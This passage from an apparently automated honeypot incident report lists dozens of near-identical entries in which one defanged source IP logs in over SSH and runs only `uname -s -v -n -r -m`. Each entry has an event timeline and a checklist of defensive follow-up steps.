| `2026-09-20 16:51:08` | `cowrie.command.input` |
| `2026-09-20 16:51:08` | `cowrie.log.closed` |
| `2026-09-20 16:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-816832aca70e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:51 |
| **Last Seen** | 2026-09-20 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:51:12` | `cowrie.session.connect` |
| `2026-09-20 16:51:12` | `cowrie.client.version` |
| `2026-09-20 16:51:12` | `cowrie.client.kex` |
| `2026-09-20 16:51:12` | `cowrie.login.success` |
| `2026-09-20 16:51:13` | `cowrie.session.params` |
| `2026-09-20 16:51:13` | `cowrie.command.input` |
| `2026-09-20 16:51:13` | `cowrie.log.closed` |
| `2026-09-20 16:51:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-415c7bd98f2a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:51 |
| **Last Seen** | 2026-09-20 16:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:51:17` | `cowrie.session.connect` |
| `2026-09-20 16:51:17` | `cowrie.client.version` |
| `2026-09-20 16:51:17` | `cowrie.client.kex` |
| `2026-09-20 16:51:17` | `cowrie.login.success` |
| `2026-09-20 16:51:18` | `cowrie.session.params` |
| `2026-09-20 16:51:18` | `cowrie.command.input` |
| `2026-09-20 16:51:19` | `cowrie.log.closed` |
| `2026-09-20 16:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b2601f51d3b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:51 |
| **Last Seen** | 2026-09-20 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:51:22` | `cowrie.session.connect` |
| `2026-09-20 16:51:22` | `cowrie.client.version` |
| `2026-09-20 16:51:22` | `cowrie.client.kex` |
| `2026-09-20 16:51:22` | `cowrie.login.success` |
| `2026-09-20 16:51:23` | `cowrie.session.params` |
| `2026-09-20 16:51:23` | `cowrie.command.input` |
| `2026-09-20 16:51:23` | `cowrie.log.closed` |
| `2026-09-20 16:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95bff960682

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:51 |
| **Last Seen** | 2026-09-20 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:51:27` | `cowrie.session.connect` |
| `2026-09-20 16:51:27` | `cowrie.client.version` |
| `2026-09-20 16:51:27` | `cowrie.client.kex` |
| `2026-09-20 16:51:27` | `cowrie.login.success` |
| `2026-09-20 16:51:28` | `cowrie.session.params` |
| `2026-09-20 16:51:28` | `cowrie.command.input` |
| `2026-09-20 16:51:28` | `cowrie.log.closed` |
| `2026-09-20 16:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f68607af1cf0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:51 |
| **Last Seen** | 2026-09-20 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:51:32` | `cowrie.session.connect` |
| `2026-09-20 16:51:32` | `cowrie.client.version` |
| `2026-09-20 16:51:33` | `cowrie.client.kex` |
| `2026-09-20 16:51:33` | `cowrie.login.success` |
| `2026-09-20 16:51:33` | `cowrie.session.params` |
| `2026-09-20 16:51:33` | `cowrie.command.input` |
| `2026-09-20 16:51:34` | `cowrie.log.closed` |
| `2026-09-20 16:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0ac703cc940

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:51 |
| **Last Seen** | 2026-09-20 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:51:38` | `cowrie.session.connect` |
| `2026-09-20 16:51:38` | `cowrie.client.version` |
| `2026-09-20 16:51:38` | `cowrie.client.kex` |
| `2026-09-20 16:51:38` | `cowrie.login.success` |
| `2026-09-20 16:51:39` | `cowrie.session.params` |
| `2026-09-20 16:51:39` | `cowrie.command.input` |
| `2026-09-20 16:51:39` | `cowrie.log.closed` |
| `2026-09-20 16:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cadda3cbda5a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:51 |
| **Last Seen** | 2026-09-20 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:51:43` | `cowrie.session.connect` |
| `2026-09-20 16:51:43` | `cowrie.client.version` |
| `2026-09-20 16:51:43` | `cowrie.client.kex` |
| `2026-09-20 16:51:43` | `cowrie.login.success` |
| `2026-09-20 16:51:44` | `cowrie.session.params` |
| `2026-09-20 16:51:44` | `cowrie.command.input` |
| `2026-09-20 16:51:44` | `cowrie.log.closed` |
| `2026-09-20 16:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b69010c5ad5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:51 |
| **Last Seen** | 2026-09-20 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:51:48` | `cowrie.session.connect` |
| `2026-09-20 16:51:48` | `cowrie.client.version` |
| `2026-09-20 16:51:48` | `cowrie.client.kex` |
| `2026-09-20 16:51:49` | `cowrie.login.success` |
| `2026-09-20 16:51:49` | `cowrie.session.params` |
| `2026-09-20 16:51:49` | `cowrie.command.input` |
| `2026-09-20 16:51:49` | `cowrie.log.closed` |
| `2026-09-20 16:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ccd4d78f968

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:51 |
| **Last Seen** | 2026-09-20 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:51:54` | `cowrie.session.connect` |
| `2026-09-20 16:51:54` | `cowrie.client.version` |
| `2026-09-20 16:51:54` | `cowrie.client.kex` |
| `2026-09-20 16:51:54` | `cowrie.login.success` |
| `2026-09-20 16:51:55` | `cowrie.session.params` |
| `2026-09-20 16:51:55` | `cowrie.command.input` |
| `2026-09-20 16:51:55` | `cowrie.log.closed` |
| `2026-09-20 16:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6ba41825757

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:51 |
| **Last Seen** | 2026-09-20 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:51:58` | `cowrie.session.connect` |
| `2026-09-20 16:51:58` | `cowrie.client.version` |
| `2026-09-20 16:51:58` | `cowrie.client.kex` |
| `2026-09-20 16:51:59` | `cowrie.login.success` |
| `2026-09-20 16:52:00` | `cowrie.session.params` |
| `2026-09-20 16:52:00` | `cowrie.command.input` |
| `2026-09-20 16:52:00` | `cowrie.log.closed` |
| `2026-09-20 16:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d6940712611

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:52 |
| **Last Seen** | 2026-09-20 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:52:04` | `cowrie.session.connect` |
| `2026-09-20 16:52:04` | `cowrie.client.version` |
| `2026-09-20 16:52:05` | `cowrie.client.kex` |
| `2026-09-20 16:52:05` | `cowrie.login.success` |
| `2026-09-20 16:52:06` | `cowrie.session.params` |
| `2026-09-20 16:52:06` | `cowrie.command.input` |
| `2026-09-20 16:52:06` | `cowrie.log.closed` |
| `2026-09-20 16:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2894c2a5f3e4

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:52 |
| **Last Seen** | 2026-09-20 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:52:10` | `cowrie.session.connect` |
| `2026-09-20 16:52:10` | `cowrie.client.version` |
| `2026-09-20 16:52:10` | `cowrie.client.kex` |
| `2026-09-20 16:52:10` | `cowrie.login.success` |
| `2026-09-20 16:52:11` | `cowrie.session.params` |
| `2026-09-20 16:52:11` | `cowrie.command.input` |
| `2026-09-20 16:52:11` | `cowrie.log.closed` |
| `2026-09-20 16:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-497585001070

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:52 |
| **Last Seen** | 2026-09-20 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:52:15` | `cowrie.session.connect` |
| `2026-09-20 16:52:15` | `cowrie.client.version` |
| `2026-09-20 16:52:15` | `cowrie.client.kex` |
| `2026-09-20 16:52:15` | `cowrie.login.success` |
| `2026-09-20 16:52:16` | `cowrie.session.params` |
| `2026-09-20 16:52:16` | `cowrie.command.input` |
| `2026-09-20 16:52:16` | `cowrie.log.closed` |
| `2026-09-20 16:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b344227a2a48

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:52 |
| **Last Seen** | 2026-09-20 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:52:20` | `cowrie.session.connect` |
| `2026-09-20 16:52:20` | `cowrie.client.version` |
| `2026-09-20 16:52:20` | `cowrie.client.kex` |
| `2026-09-20 16:52:21` | `cowrie.login.success` |
| `2026-09-20 16:52:21` | `cowrie.session.params` |
| `2026-09-20 16:52:21` | `cowrie.command.input` |
| `2026-09-20 16:52:22` | `cowrie.log.closed` |
| `2026-09-20 16:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91c714c7f508

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:52 |
| **Last Seen** | 2026-09-20 16:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:52:25` | `cowrie.session.connect` |
| `2026-09-20 16:52:25` | `cowrie.client.version` |
| `2026-09-20 16:52:25` | `cowrie.client.kex` |
| `2026-09-20 16:52:26` | `cowrie.login.success` |
| `2026-09-20 16:52:27` | `cowrie.session.params` |
| `2026-09-20 16:52:27` | `cowrie.command.input` |
| `2026-09-20 16:52:27` | `cowrie.log.closed` |
| `2026-09-20 16:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d68821216f10

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:52 |
| **Last Seen** | 2026-09-20 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:52:31` | `cowrie.session.connect` |
| `2026-09-20 16:52:31` | `cowrie.client.version` |
| `2026-09-20 16:52:31` | `cowrie.client.kex` |
| `2026-09-20 16:52:31` | `cowrie.login.success` |
| `2026-09-20 16:52:32` | `cowrie.session.params` |
| `2026-09-20 16:52:32` | `cowrie.command.input` |
| `2026-09-20 16:52:33` | `cowrie.log.closed` |
| `2026-09-20 16:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aae5745018e1

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:52 |
| **Last Seen** | 2026-09-20 16:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:52:37` | `cowrie.session.connect` |
| `2026-09-20 16:52:37` | `cowrie.client.version` |
| `2026-09-20 16:52:37` | `cowrie.client.kex` |
| `2026-09-20 16:52:37` | `cowrie.login.success` |
| `2026-09-20 16:52:38` | `cowrie.session.params` |
| `2026-09-20 16:52:38` | `cowrie.command.input` |
| `2026-09-20 16:52:39` | `cowrie.log.closed` |
| `2026-09-20 16:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-071a8bbd06b9

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:52 |
| **Last Seen** | 2026-09-20 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:52:42` | `cowrie.session.connect` |
| `2026-09-20 16:52:42` | `cowrie.client.version` |
| `2026-09-20 16:52:42` | `cowrie.client.kex` |
| `2026-09-20 16:52:42` | `cowrie.login.success` |
| `2026-09-20 16:52:43` | `cowrie.session.params` |
| `2026-09-20 16:52:43` | `cowrie.command.input` |
| `2026-09-20 16:52:44` | `cowrie.log.closed` |
| `2026-09-20 16:52:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cfa3614d2a7

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:52 |
| **Last Seen** | 2026-09-20 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:52:48` | `cowrie.session.connect` |
| `2026-09-20 16:52:48` | `cowrie.client.version` |
| `2026-09-20 16:52:48` | `cowrie.client.kex` |
| `2026-09-20 16:52:48` | `cowrie.login.success` |
| `2026-09-20 16:52:49` | `cowrie.session.params` |
| `2026-09-20 16:52:49` | `cowrie.command.input` |
| `2026-09-20 16:52:49` | `cowrie.log.closed` |
| `2026-09-20 16:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ca7afbfdca3

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:52 |
| **Last Seen** | 2026-09-20 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:52:53` | `cowrie.session.connect` |
| `2026-09-20 16:52:53` | `cowrie.client.version` |
| `2026-09-20 16:52:53` | `cowrie.client.kex` |
| `2026-09-20 16:52:53` | `cowrie.login.success` |
| `2026-09-20 16:52:54` | `cowrie.session.params` |
| `2026-09-20 16:52:54` | `cowrie.command.input` |
| `2026-09-20 16:52:54` | `cowrie.log.closed` |
| `2026-09-20 16:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fff028b3839f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:52 |
| **Last Seen** | 2026-09-20 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:52:57` | `cowrie.session.connect` |
| `2026-09-20 16:52:58` | `cowrie.client.version` |
| `2026-09-20 16:52:58` | `cowrie.client.kex` |
| `2026-09-20 16:52:58` | `cowrie.login.success` |
| `2026-09-20 16:52:59` | `cowrie.session.params` |
| `2026-09-20 16:52:59` | `cowrie.command.input` |
| `2026-09-20 16:52:59` | `cowrie.log.closed` |
| `2026-09-20 16:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e1986b31bc3

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:53 |
| **Last Seen** | 2026-09-20 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:53:03` | `cowrie.session.connect` |
| `2026-09-20 16:53:03` | `cowrie.client.version` |
| `2026-09-20 16:53:03` | `cowrie.client.kex` |
| `2026-09-20 16:53:03` | `cowrie.login.success` |
| `2026-09-20 16:53:04` | `cowrie.session.params` |
| `2026-09-20 16:53:04` | `cowrie.command.input` |
| `2026-09-20 16:53:05` | `cowrie.log.closed` |
| `2026-09-20 16:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f5761b89d2b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:53 |
| **Last Seen** | 2026-09-20 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:53:08` | `cowrie.session.connect` |
| `2026-09-20 16:53:08` | `cowrie.client.version` |
| `2026-09-20 16:53:08` | `cowrie.client.kex` |
| `2026-09-20 16:53:09` | `cowrie.login.success` |
| `2026-09-20 16:53:10` | `cowrie.session.params` |
| `2026-09-20 16:53:10` | `cowrie.command.input` |
| `2026-09-20 16:53:10` | `cowrie.log.closed` |
| `2026-09-20 16:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7048275f62e0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:53 |
| **Last Seen** | 2026-09-20 16:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:53:13` | `cowrie.session.connect` |
| `2026-09-20 16:53:13` | `cowrie.client.version` |
| `2026-09-20 16:53:13` | `cowrie.client.kex` |
| `2026-09-20 16:53:14` | `cowrie.login.success` |
| `2026-09-20 16:53:15` | `cowrie.session.params` |
| `2026-09-20 16:53:15` | `cowrie.command.input` |
| `2026-09-20 16:53:15` | `cowrie.log.closed` |
| `2026-09-20 16:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e241a66b9b65

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:53 |
| **Last Seen** | 2026-09-20 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:53:19` | `cowrie.session.connect` |
| `2026-09-20 16:53:19` | `cowrie.client.version` |
| `2026-09-20 16:53:19` | `cowrie.client.kex` |
| `2026-09-20 16:53:19` | `cowrie.login.success` |
| `2026-09-20 16:53:20` | `cowrie.session.params` |
| `2026-09-20 16:53:20` | `cowrie.command.input` |
| `2026-09-20 16:53:21` | `cowrie.log.closed` |
| `2026-09-20 16:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f33f1cd3d0c5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:53 |
| **Last Seen** | 2026-09-20 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
